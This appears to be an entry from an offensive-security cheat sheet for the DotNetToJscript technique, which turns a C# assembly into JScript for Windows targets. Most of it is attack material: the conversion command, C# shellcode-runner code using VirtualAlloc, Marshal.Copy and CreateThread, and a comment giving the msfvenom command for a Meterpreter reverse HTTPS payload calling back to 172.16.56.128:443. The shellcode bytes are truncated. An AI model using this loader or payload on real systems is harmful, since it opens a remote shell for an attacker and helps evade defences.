---
description: |
  The DotNetToJscript project demonstrated how to execute C# assembly from Jscript. Build entire solution and in order to work with DotNetToJscript we need to have the following files on the target machine:

  Command Reference:
  ```
  DotNetToJscript.exe
  NDesk.Options.dll
  ExampleAssembly.dll: output from C# solution, hold the C# assembly of what the code needs to do.

  ```
command: |
  .\DotNetToJScript.exe .\ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js

code: |
  using System;
  using System.Diagnostics;
  using System.Runtime.InteropServices;

  [ComVisible(true)]
  public class TestClass
  {
      [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
      static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

      [DllImport("kernel32.dll")]
      static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

      [DllImport("kernel32.dll")]
      static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

      public TestClass()
      {
          // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.56.128 LPORT=443 -f csharp
          byte[] buf = new byte[722] {0xfc,0x48,0x83, ... 0x56,0xff,0xd5};


          IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
          Marshal.Copy(buf, 0, addr, buf.Length);
          IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
          WaitForSingleObject(hThread, 0xFFFFFFFF);
     }

      public void RunProcess(string path)
      {
          Process.Start(path);
      }
  } 

items:
  - Shell
services:
  
OS:
  - Windows
attack_types:
  - Injection
references:
  - https://github.com/tyranid/DotNetToJScript
  - https://www.ired.team/offensive-security/defense-evasion/executing-csharp-assemblies-from-jscript-and-wscript-with-dotnettojscript
---